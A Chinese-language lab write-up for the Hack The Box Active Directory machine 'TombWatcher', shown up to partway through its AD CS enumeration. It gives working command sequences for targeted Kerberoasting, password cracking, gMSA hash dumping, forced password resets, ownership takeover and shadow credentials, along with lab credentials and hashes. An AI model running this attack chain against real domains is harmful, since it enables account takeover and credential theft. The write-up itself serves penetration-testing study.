As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account:
`henry / H3nry_987TGV!`

## namp

```bash
┌──(root㉿kali)-[~kali/Desktop]
└─# nmap -sC -sV -Pn -T4 10.10.11.72
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-08 06:23 EDT
Nmap scan report for 10.10.11.72
Host is up (0.98s latency).              
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-08 14:25:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-08T14:27:42+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-08-08T14:27:39+00:00; +3h59m59s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-08T14:27:44+00:00; +3h59m57s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-08-08T14:27:39+00:00; +3h59m59s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 3h59m58s, deviation: 0s, median: 3h59m58s
| smb2-time: 
|   date: 2025-08-08T14:26:55
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 277.24 seconds
```

看了一下开放的端口，得知这是一台域控机器

把IP和域名以及写进/etc/hosts

## smb/ldap/winrm

刚开始已经给了凭证，那么直接nxc试一下smb：好的，没扫出来有价值的东西

```bash
┌──(root㉿kali)-[~kali/Desktop]
└─# nxc smb 10.10.11.72 -u "henry" -p 'H3nry_987TGV!' --shares
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [-] Error checking if user is admin on 10.10.11.72: The NETBIOS connection with the remote host timed out.
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
SMB         10.10.11.72     445    DC01             [-] Error enumerating shares: The NETBIOS connection with the remote host timed out.
```

那直连进去看看，连不进去：

```bash
┌──(root㉿kali)-[~kali/Desktop]
└─# smbclient -L //DC01.tombwatcher.htb/ -U 'henry'              
Password for [WORKGROUP\henry]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to DC01.tombwatcher.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```bash
┌──(root㉿kali)-[~kali/Desktop]
└─# nxc ldap 10.10.11.72 -u "henry" -p 'H3nry_987TGV!' --users
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
LDAP        10.10.11.72     389    DC01             [*] Enumerated 7 domain users: tombwatcher.htb
LDAP        10.10.11.72     389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                        
LDAP        10.10.11.72     389    DC01             Administrator                 2025-04-25 10:56:03 0        Built-in account for administering the computer/domain                                        
LDAP        10.10.11.72     389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain                                      
LDAP        10.10.11.72     389    DC01             krbtgt                        2024-11-15 19:02:28 0        Key Distribution Center Service Account              
LDAP        10.10.11.72     389    DC01             Henry                         2025-05-12 11:17:03 0                    
LDAP        10.10.11.72     389    DC01             Alfred                        2025-05-12 11:17:03 0                    
LDAP        10.10.11.72     389    DC01             sam                           2025-05-12 11:17:03 0                    
LDAP        10.10.11.72     389    DC01             john                          2025-05-19 09:25:10 0     
```

终于用户扫出来了

密码喷洒其他几个用户也没有

winrm肯定连不上

## bloodhound

```bash
┌──(root㉿kali)-[~kali/Desktop]
└─# bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -dc DC01.tombwatcher.htb -c all -ns 10.10.11.72 --zip   
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: DC01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.72:445)] timed out
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.72:445)] timed out
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.72:445)] timed out
INFO: Done in 03M 59S
INFO: Compressing output into 20250808144348_bloodhound.zip
```

出站控制：

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/84fba8e8e0cc40b9b3a9e7bfda93ee9f.png)
用户`henry` 对 用户`alfred` 有 `WriteSPN` 权限

整体攻击路径：

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e05e3a058c214d9aa857387da460beec.png)

### 通过SPN打印用户哈希值

因为是kerberoast攻击，所以先ntpdate
然后使用这个工具：
[targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
**工具功能说明**  
targetedKerberoast是一款Python脚本，与GetUserSPNs.py等工具类似，可打印已设置SPN（服务主体名称）的用户账户的"kerberoast"哈希值。该工具新增的核心功能是：**针对未设置SPN的用户，尝试通过滥用_servicePrincipalName_属性的写入权限，临时添加SPN、获取哈希值，随后立即删除该临时SPN**。这种技术被称为"定向Kerberoasting"（Targeted Kerberoasting），支持以下三种目标选择模式：

1. 针对域内所有用户  
2. 基于提供的用户列表  
3. 通过命令行直接指定单个用户

```bash
┌──(root㉿kali)-[/home/kali/Desktop/targetedKerberoast]
└─# python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u henry -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory 
with LDAP
[!] Could not modify (Administrator), the 
server reports a constrained violation
[!] Could not modify (Henry), the server 
reports a constrained violation
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$5f9e944e20a5d8e32a81dbeb4cd8c808$dc83210b6459f23f09346902d3dfab5055adab1ca297e5e7869a36108a4c658d2c258358b0ea71ef4eb293179f257abb4fd3aff43123ef72d5121b52d2f7243e760c6273c097f1494e5ba8d6be657802bd6c9d57720fddee8f11f164d05b93f243fcb5b92172429207e4ebd89700ec034203bcf4acf0ca772e1b5ee9ac0ef920602904fd6cbc9a26eb6c87d5c164588044669e655c5cc1b3754ad08d68db554f1bf9a1a1b7af8416700a82c788ec855d1e38e28c7c4af6c2dc0b0286f574131bc43c9862666a722ae71dc3e64253f93fc109d1a71c500bf5a45caed0eb0e915899372db05427c2c9fa64cc4e9783dca3377b825b1c7fa31cf9b1c06cf9822011a93f1c292d527a1d92b2852a9cd1c9fdb915761a97c085a0659ffbb2640bd95a00756b92b5e51f3cbb7c02c3e52d13df3a69d7b7cedf00df8ecbe62ff666f478e248b9991590f15692bd0a2d69af745b5fafd4d6419a22a3dd62a65e3280ef6da15ff49599a2073b5d8b284641ff33db9d596c5044fee156e3ce0c52e841f8b8aa7aebc8074e7aaf7933e0958f2c88351c4ae2a15a362205f04ff69774cdc531787bab18fcf3a220bba463c32c7d321e5270d9880434fcd197074b33a510222f85c77494db799d73ac2716a3882912a7fefb485d35f234e8afd09b0af0f13184b79c0cecb7d79edd3be42857cf67ceafdd1f3281d9038b930612daaffdc31429eb80080a55437f26ee1227fa5bf07700fc66424b8ec315303c81734de5fb84538699a52a88a99b5d5757ddb0983483d6e0095b7f8af128a825515e024ceaa4ba6f8fa4f2c0d11786a36d2b06fef3eae71f5be29fea58517a3dfacfae6c0494215771bce05f456a2227d89e05dd42d3e37711e9e76ddc0675a6954a8777a805d0ff66dc358d5ca3f2031416037d7d8843263b1a2d88b3317c7c4779f477b8f5ca188c5081aff034f916eefc5b4aff818f1404bcab0478642b2a6bcea7ec6ad81be152b604abee5cdc7aecd548ce5de4e36846cf3d4d697de3ca5c2908fedaebd865450ddf39420b52a1e138908c7a3a890f239ec2ccd1d936526643cee7e17b858d60e52d479e7734afda90e71725e714905390541e5d458579ea4afae567bb1f317fa859466f0e926ef86ae5b910ac8a8d7d4ecba3d0f0a6e8647e16b4e4a44c8d8bb9ecd88b80fd8351946366a69a42dec1a8e54be0b263a2c6121333aa1549fbc801fba5e9622a1f48e54243ba0e50cbd832f39dab0a639f73c1f35a211223e8bdcff13bdce60a3a24337af678239adae99d499060ed9eca36e870f9783f805a8e1972220dd945d320acc1aab4de5572d138c58e84515eeef63b6599ebfd2544c665faf13fa6066907cdaa2232c34828568a2f946f625c3414170f2d078e2bc61eed8ad256529b1f35aad4ec745f3227eb14287cbb41c4da219c47c2bbc5872f8abc0402b86a38432c47df8fca04c4df512c27ed
[!] Could not modify (sam), the server 
reports a constrained violation
[!] Could not modify (john), the server 
reports a constrained violation
```

得到`Alfred`用户的TGS票据

### john爆破

使用john爆破

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)     
1g 0:00:00:00 DONE (2025-08-09 14:19) 50.00g/s 51200p/s 51200c/s 51200C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

得到密码：`basketball`

但此用户winrm不上

根据先前的攻击链，`Alfred`用户对`infrastructure`有`addself`权限，所以可以将用户加入该组：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# bloodyAD -d tombwatcher.htb -u alfred -p basketball --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred
[+] alfred added to INFRASTRUCTURE
```

### nxc ReadGMSAPassword

### 1. **gMSA（Group Managed Service Account）**

- **定义**：组管理服务账户是 Active Directory 中的一种特殊服务账户，其密码由域控制器自动管理和轮换（默认 30 天），主要用于域内服务身份验证。
- **特点**：
  - 密码存储在 `msDS-ManagedPassword` 属性中，通过 LDAP 协议可查询
  - 密码由域控制器自动更新，无需人工干预
  - 通常关联到需要高权限运行的服务（如数据库、自动化工具等）
    
    ### 2. **ReadGMSAPassword 权限**
- **权限含义**：允许主体（用户/组）读取指定 gMSA 账户的密码哈希（NTLM 或 AES 密钥）。
- **攻击价值**：
  - 直接获取服务账户凭据，用于横向移动
  - 可用于 PTH（Pass-The-Hash）攻击或 Kerberos 票据请求
  - 结合权限链可快速提权至域管理员

---

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nxc ldap 10.10.11.72 -u 'alfred' -p 'basketball' --gmsa
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAPS       10.10.11.72     636    DC01             [+] tombwatcher.htb\alfred:basketball
LDAPS       10.10.11.72     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.72     636    DC01             Account: ansible_dev$         NTLM: 7bc5a56af89da4d3c03bc048055350f2     PrincipalsAllowedToReadPassword: Infrastructure   
```

也可使用此工具：
[gMSADumper](https://github.com/micahvandeusen/gMSADumper)

```bash
┌──(root㉿kali)-[/home/kali/Desktop/gMSADumper]
└─# python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::7bc5a56af89da4d3c03bc048055350f2
ansible_dev$:aes256-cts-hmac-sha1-96:29a7e3cc3aaad2b30beca182a9707f1a1e71d2eb49a557d50f9fd91360ec2f64
ansible_dev$:aes128-cts-hmac-sha1-96:de6c86d8b6a71c4538f82dc570f7f9a6
```

### ForceChangePassword

直接修改`sam`用户的密码：

```bash
┌──(root㉿kali)-[/home/kali/Desktop/gMSADumper]
└─# bloodyAD --dc-ip 10.10.11.72 -d tombwatcher.htb -u 'ansible_dev$' -p ':7bc5a56af89da4d3c03bc048055350f2' set password 'sam' 'passwd@123'
[+] Password changed successfully!
```

sam用户winrm不上

### WriteOwner

#### **1. 核心概念与攻击链**

- **WriteOwner 权限**：允许用户修改对象（如用户账户）的所有者。
- **GenericAll 权限**：赋予对目标对象的完全控制权（包括修改密码、属性、权限等）。
- **Shadow Credentials（影子凭证）**：通过向目标账户添加伪造的 Kerberos 密钥凭据（`msDS-KeyCredentialLink`），获取其 NTLM 哈希或服务票据（TGT）。

**攻击流程**：

1. **修改所有者**：利用 `WriteOwner` 将目标用户 `john` 的所有者设为 `sam`。
2. **赋予完全控制**：作为所有者，授予 `sam` 对 `john` 的 `GenericAll` 权限。
3. **添加影子凭证**：利用 `GenericAll` 权限向 `john` 的 `msDS-KeyCredentialLink` 属性写入恶意凭据。
4. **获取 NTLM 哈希**：通过 Kerberos 协议利用该凭据获取 `john` 的哈希或票据。

---

```bash
┌──(root㉿kali)-[/home/kali/Desktop/gMSADumper]
└─# bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'sam' -p 'passwd@123' set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john

┌──(root㉿kali)-[/home/kali/Desktop/gMSADumper]
└─# bloodyAD --dc-ip 10.10.11.72 -d tombwatcher -u 'sam' -p 'passwd@123' add genericAll john sam
[+] sam has now GenericAll on john

┌──(root㉿kali)-[/home/kali/Desktop/gMSADumper]
└─# certipy-ad shadow auto -target tombwatcher.htb -dc-ip 10.10.11.72 -username sam -password 'passwd@123' -account john
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '9041a991-1660-a0a4-9b38-78531b51460f'
[*] Adding Key Credential with device ID '9041a991-1660-a0a4-9b38-78531b51460f' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID '9041a991-1660-a0a4-9b38-78531b51460f' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'john@tombwatcher.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': None
```

获取hash失败，那咱直接改密码吧

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/176b03d87b434e36ab48bd958b16fc77.png)

改密码属于速通了

继续尝试winrm

## winrm

```bash
evil-winrm -i 10.10.11.72 -u 'john' -p 'passwd@123'
```

成功

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/57a2f787a6ea43e3bd934b48cdc8ed43.png)

## 权限提升

### ADCS

#### **1. ADCS 定义**

**ADCS（Active Directory 证书服务）** 是微软 Windows Server 提供的核心服务之一，用于构建企业级 **公钥基础设施（PKI, Public Key Infrastructure）**。其主要功能是 **颁发、管理、验证和吊销数字证书**，为域内外的实体（用户、计算机、服务）提供加密、签名和身份验证支持。

---

#### **2. ADCS 核心功能**

| 功能        | 描述                                      |
| --------- | --------------------------------------- |
| **证书颁发**  | 为客户端或服务颁发数字证书（如 SSL/TLS、身份验证、代码签名证书）。   |
| **密钥管理**  | 集中管理证书的生成、存储和生命周期（颁发、续订、吊销）。            |
| **身份验证**  | 基于证书的身份验证（如智能卡登录、VPN 接入）。               |
| **加密与签名** | 支持数据加密（如 S/MIME 邮件）、文档数字签名（如 PDF、代码签名）。 |

---

#### **3. ADCS 核心组件**

| 组件                              | 作用                                          |
| ------------------------------- | ------------------------------------------- |
| **证书颁发机构（CA）**                  | 负责签署证书的核心服务器（Root CA 或 Subordinate CA）。     |
| **证书模板（Certificate Templates）** | 定义证书的类型、用途、有效期、密钥参数等（如 `User`、`WebServer`）。 |
| **证书注册 Web 服务（CES/CEP）**        | 允许用户通过 Web 页面或协议（如 SCEP）申请证书。               |
| **证书吊销列表（CRL）**                 | 存储已吊销证书的序列号，供客户端验证证书状态。                     |
| **在线响应服务（OCSP）**                | 实时验证证书状态（替代传统 CRL 文件）。                      |

---

#### **4. ADCS 在企业中的应用场景**

- **用户身份验证**：智能卡登录、VPN/远程桌面双因素认证。
- **设备认证**：IoT 设备、移动设备接入企业网络的证书认证。
- **安全通信**：加密 HTTPS（Web 服务器证书）、SMB 签名、IPsec 通信。
- **代码签名**：确保软件发布的完整性和来源可信性。

---

#### **5. ADCS 的安全风险与攻击面**

ADCS 因其核心地位成为攻击者重点目标，常见攻击包括：

##### **5.1 证书模板滥用**

- **ESC1/ESC6 漏洞**：恶意用户利用模板配置错误（如允许任意主体注册、启用 `ENROLLEE_SUPPLIES_SUBJECT`）申请高权限证书。
  
  ```powershell
  # 示例：查找允许客户端指定 SAN 的模板
  Get-CertificateTemplate | Where-Object { $_.SubjectNameFlags -match "ENROLLEE_SUPPLIES_SUBJECT" }
  ```

##### **5.2 证书窃取与伪造**

- **NTLM 中继到 AD CS HTTP 端点**：攻击者通过劫持证书注册请求伪造证书。
- **证书持久化后门**：在攻陷 CA 后签发长期有效证书，绕过密码重置。

##### **5.3 影子凭证（Shadow Credentials）**

- 向用户对象的 `msDS-KeyCredentialLink` 属性注入密钥，通过 PKINIT 获取 TGT 票据。
  
  ```bash
  # 使用 Certipy-AD 执行影子凭证攻击
  certipy-ad shadow auto -username user -password pass -account target_user -dc-ip 10.10.10.1
  ```

##### **5.4 证书权限滥用**

- 拥有 `ManageCA` 或 `ManageCertificates` 权限的用户可篡改模板或吊销证书。

---

#### **6. ADCS 防御最佳实践**

1. **最小权限原则**  
   
   - 限制证书模板的注册权限，禁用高危模板（如 `Domain Controller` 模板开放给普通用户）。
   - 使用 **RBAC（基于角色的访问控制）** 管理 CA 操作权限。

2. **安全配置证书模板**  
   
   - 禁用 `ENROLLEE_SUPPLIES_SUBJECT` 选项。
   - 设置合理的证书有效期（如不超过 1 年）。
   - 启用 **CA 证书颁发审核**（Windows 事件 ID `4870`、`4871`）。

3. **监控与响应**  
   
   - 监控异常证书请求（如普通用户申请 `Domain Controller` 证书）。
   - 使用工具分析证书链信任关系：
     
     ```powershell
     certutil -verify -urlfetch MyCertificate.cer
     ```

4. **禁用不安全协议**  
   
   - 关闭 **HTTP 证书注册接口**（仅保留 HTTPS）。
   - 禁用 **SCEP（简单证书注册协议）** 若无需使用。

5. **定期轮换 CA 证书**  
   
   - 避免根证书长期暴露（如每 5 年轮换一次）。

---

#### **7. 攻击检测示例**

```powershell
# 检测异常证书注册请求（事件 ID 4886 或 4887）
Get-WinEvent -LogName "Microsoft-Windows-CertificateServicesClient-CertEnroll" | 
  Where-Object { $_.Id -eq 4886 -and $_.Message -match "敏感模板名称" }

# 查找被添加 Key Credential 的用户
Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
  Where-Object { $_.'msDS-KeyCredentialLink' } |
  Select-Object Name, DistinguishedName
```

---

这里可以发现最初用低权限用户探测的路径下，ADCS下0对象，啥都没有：

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/795cd9eb7cd24fdda4e769e478ae80f5.png)

这里前置步骤很多，短时内如果没有拿到root的flag，靶机会清空先前改的密码，所以把前置步骤可以写到sh脚本直接运行，然后就可以继续愉快地进行之后的步骤

所以我们可以用john用户再探测一下试试：

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/79fbb26a317942208a8304ffa71a1808.png)

路径图有些许变化，那是我们先前添加的权限：

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/35794f0ffab9405d89fe119e9ff3c5ae.png)

但是ADCS里的对象依然是空的

那扫下域内 Active Directory 证书服务 (AD CS) 的潜在漏洞：

```bash
┌──(root㉿kali)-[~kali/Desktop]
└─# certipy-ad find -u john -p passwd@123 -dc-ip 10.10.11.72 -vulnerable

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250810104757_Certipy.txt'
[*] Wrote text output to '20250810104757_Certipy.txt'
[*] Saving JSON output to '20250810104757_Certipy.json'
[*] Wrote JSON output to '20250810104757_Certipy.json'
```

结果如下：

```20250810104757_Certipy.txt
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates
```

全局扫描结果：

```bash
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : KerberosAuthentication
    Display Name                        : Kerberos Authentication
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDomainDns
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
  1
    Template Name                       : OCSPResponseSigning
    Display Name                        : OCSP Response Signing
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AddOcspNocheck
                                          Norevocationinfoinissuedcerts
    Extended Key Usage                  : OCSP Signing
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : msPKI-Asymmetric-Algorithm`PZPWSTR`RSA`msPKI-Hash-Algorithm`PZPWSTR`SHA1`msPKI-Key-Security-Descriptor`PZPWSTR`D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;GR;;;S-1-5-80-3804348527-3718992918-2141599610-3686422417-2726379419)`msPKI-Key-Usage`DWORD`2`
    Authorized Signatures Required      : 0
    Schema Version                      : 3
    Validity Period                     : 2 weeks
    Renewal Period                      : 2 days
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  2
    Template Name                       : RASAndIASServer
    Display Name                        : RAS and IAS Server
    Enabled                             : False
